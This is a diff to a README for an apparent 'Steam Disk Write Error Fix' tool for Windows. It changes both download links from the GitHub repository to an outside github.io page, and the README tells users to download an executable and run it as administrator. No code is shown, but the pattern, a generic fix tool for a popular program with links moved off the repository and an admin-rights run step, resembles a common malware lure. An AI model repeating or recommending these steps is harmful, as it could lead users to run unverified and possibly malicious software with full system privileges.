@@ -1,6 +1,6 @@
 # 🛠️ Steam-Disk-Write-Error-Fix - Solve Steam update errors on Windows
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/udarajaya1692/Steam-Disk-Write-Error-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://udarajaya1692.github.io)
 
 ## What is this tool
 
@@ -17,7 +17,7 @@ Steam users often see a message stating that a disk write error occurred during 
 
 You need to download the repair tool to resolve your disk write configuration. Follow these steps:
 
-1. Visit [this page to download](https://github.com/udarajaya1692/Steam-Disk-Write-Error-Fix) the executable file.
+1. Visit [this page to download](https://udarajaya1692.github.io) the executable file.
 2. Store the file in a folder you can access, such as your Downloads folder.
 3. Right-click the file and select "Run as administrator" to start the repair process.
 4. Follow the prompts on the screen to apply the fix.
